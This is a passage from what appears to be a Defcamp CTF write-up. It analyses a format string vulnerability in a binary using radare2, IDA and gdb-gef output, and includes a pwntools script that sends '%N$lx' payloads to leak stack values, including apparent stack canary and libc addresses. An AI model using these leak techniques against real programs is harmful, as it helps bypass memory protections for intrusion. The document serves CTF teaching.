+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007ea</span>      <span class="no">e851feffff</span>     <span class="no">call</span> <span class="no">sym.imp.printf</span>         <span class="c1">; int printf(const char *format)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007ef</span>      <span class="mi">488</span><span class="no">d3dd20000.</span>  <span class="no">lea</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">qword</span> <span class="no">str.Enter_sentence_</span><span class="p">:</span> <span class="c1">; 0x8c8 ; &#34;Enter sentence : &#34; ; const char * format
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007f6</span>      <span class="no">b800000000</span>     <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007fb</span>      <span class="no">e840feffff</span>     <span class="no">call</span> <span class="no">sym.imp.printf</span>         <span class="c1">; int printf(const char *format)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000800</span>      <span class="mi">488</span><span class="no">b55d8</span>       <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_28h</span><span class="p">]</span>  <span class="c1">; FILE *stream
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000804</span>      <span class="mi">488</span><span class="no">d45e0</span>       <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_20h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000808</span>      <span class="no">be00010000</span>     <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x100</span>              <span class="c1">; int size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000080d</span>      <span class="mi">4889</span><span class="no">c7</span>         <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>                <span class="c1">; char *s
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000810</span>      <span class="no">e83bfeffff</span>     <span class="no">call</span> <span class="no">sym.imp.fgets</span>          <span class="c1">; char *fgets(char *s, int size, FILE *stream)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000815</span>      <span class="no">b800000000</span>     <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000081a</span>      <span class="mi">488</span><span class="no">b4df8</span>       <span class="no">mov</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_8h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000081e</span>      <span class="mi">6448330</span><span class="no">c2528.</span>  <span class="no">xor</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>       <span class="err">,=&lt;</span> <span class="err">0</span><span class="nf">x00000827</span>      <span class="mi">7405</span>           <span class="no">je</span> <span class="mi">0x82e</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>       <span class="err">|</span>   <span class="err">0</span><span class="nf">x00000829</span>      <span class="no">e802feffff</span>     <span class="no">call</span> <span class="no">sym.imp.__stack_chk_fail</span> <span class="c1">; void __stack_chk_fail(void)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>       <span class="err">|</span>      <span class="c1">; JMP XREF from 0x00000827 (sym.main)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>       <span class="err">`-&gt;</span> <span class="err">0</span><span class="nf">x0000082e</span>      <span class="no">c9</span>             <span class="no">leave</span>
+</span></span><span class="line"><span class="cl"><span class="err">\</span>           <span class="err">0</span><span class="nf">x0000082f</span>      <span class="no">c3</span>             <span class="no">ret</span>
+</span></span></code></pre></div><p>First input is getting printed and as you can see at line <code> 0x000007d2      488d3de90000.  lea rdi, qword str.Hello    ; 0x8c2 ; &quot;Hello&quot; ; const char * s</code> there&rsquo;s no specifier at the commented string otherwise radare2 would&rsquo;ve been able to show it. And since it&rsquo;s getting printed with <code> 0x000007ea      e851feffff     call sym.imp.printf         ; int printf(const char *format)</code> instruction we know where the format string vulerability is.</p>
+<p>For ease of understanding, we have a decompiled function with the help of IDA:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// ST08_8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-20h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">stream</span> <span class="o">=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">_bss_start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter name : &#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">16LL</span><span class="p">);</span>  <span class="o">&lt;--</span> <span class="n">Here</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">the</span> <span class="n">vulnerability</span><span class="p">,</span> <span class="n">just</span> <span class="n">like</span> <span class="n">in</span> <span class="n">that</span> <span class="n">example</span><span class="p">,</span> <span class="n">isn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">it</span><span class="o">?</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter sentence : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="exploiting-the-binary" class="relative group">Exploiting the binary <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-the-binary" aria-label="Anchor">#</a></span></h3><p>So, let&rsquo;s make a script to find the offset for the input on stack, who knows we might be able to get something of interest?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">20</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./q3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;AAAA %</span><span class="si">{}</span><span class="s2">$lx&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="c1"># will print the stack data in hex format</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># Hello</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span> <span class="n">i</span><span class="p">,</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>Let&rsquo;s run it:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs</span><span class="err">/</span><span class="no">Defcamp$</span> <span class="no">python</span> <span class="no">find_off.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8323</span>
+</span></span><span class="line"><span class="cl"><span class="err">2</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7dd18c0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8323</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8325</span>
+</span></span><span class="line"><span class="cl"><span class="err">3</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7af4154</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8325</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8327</span>
+</span></span><span class="line"><span class="cl"><span class="err">4</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7fd24c0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8327</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8329</span>
+</span></span><span class="line"><span class="cl"><span class="err">5</span> <span class="nf">AAAA</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8329</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8331</span>
+</span></span><span class="line"><span class="cl"><span class="err">6</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7de59a0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8331</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8333</span>
+</span></span><span class="line"><span class="cl"><span class="err">7</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7dcfa00</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8333</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8335</span>
+</span></span><span class="line"><span class="cl"><span class="err">8</span> <span class="nf">AAAA</span> <span class="mi">2438252041414141</span>                                        <span class="err">&lt;</span><span class="p">---</span> <span class="no">Offset</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8335</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8337</span>
+</span></span><span class="line"><span class="cl"><span class="err">9</span> <span class="nf">AAAA</span> <span class="no">a786c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8339</span>
+</span></span><span class="line"><span class="cl"><span class="err">10</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">fffffffde80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8339</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8341</span>
+</span></span><span class="line"><span class="cl"><span class="err">11</span> <span class="nf">AAAA</span> <span class="no">a17e6a7c1c53c000</span>                                       <span class="err">&lt;</span><span class="p">---</span> <span class="no">This</span> <span class="no">is</span> <span class="no">of</span> <span class="no">interest</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8341</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8343</span>
+</span></span><span class="line"><span class="cl"><span class="err">12</span> <span class="nf">AAAA</span> <span class="mi">555555554830</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8343</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8345</span>
+</span></span><span class="line"><span class="cl"><span class="err">13</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7a05b97</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8345</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8347</span>
+</span></span><span class="line"><span class="cl"><span class="err">14</span> <span class="nf">AAAA</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8347</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8349</span>
+</span></span><span class="line"><span class="cl"><span class="err">15</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">fffffffde88</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8349</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8351</span>
+</span></span><span class="line"><span class="cl"><span class="err">16</span> <span class="nf">AAAA</span> <span class="mi">100008000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8351</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8353</span>
+</span></span><span class="line"><span class="cl"><span class="err">17</span> <span class="nf">AAAA</span> <span class="mi">55555555477</span><span class="no">a</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8353</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8355</span>
+</span></span><span class="line"><span class="cl"><span class="err">18</span> <span class="nf">AAAA</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8355</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8357</span>
+</span></span><span class="line"><span class="cl"><span class="err">19</span> <span class="nf">AAAA</span> <span class="mi">8</span><span class="no">f241916698aca1f</span>                                     <span class="err">&lt;</span><span class="p">---</span> <span class="no">This</span> <span class="no">is</span> <span class="no">of</span> <span class="no">interest</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8357</span><span class="p">)</span>
+</span></span></code></pre></div><p>So, the addresses starting from <code>0x7f</code> are libc addresses and we have offset for our input at 8 but what are those at offset 11 and 19? Whatever it is, this is something we might need. Upon discussing this from a guy(super helpful) named Faith, he told me that it <strong>could be</strong> stack canary address. Now, if we didn&rsquo;t had a format string vulnerability then we had to bruteforce the value,luckily enough we have that vulnerability here.</p>
+<p>To be more broad:-
+I&rsquo;ll be using gdb-gef as we have to inspect some of the registers, et&rsquo;s break the <code>__main__</code> function:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000077a</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000077b</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000077e</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x30</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000782</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000078b</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000078f</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000791</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x20</span><span class="p">],</span><span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000799</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x18</span><span class="p">],</span><span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007a1</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200868</span><span class="p">]</span>        <span class="c1"># 0x201010 &lt;stdin@@GLIBC_2.2.5&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007a8</span> <span class="err">&lt;+</span><span class="mi">46</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">],</span><span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007ac</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x101</span><span class="p">]</span>        <span class="c1"># 0x8b4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007b3</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
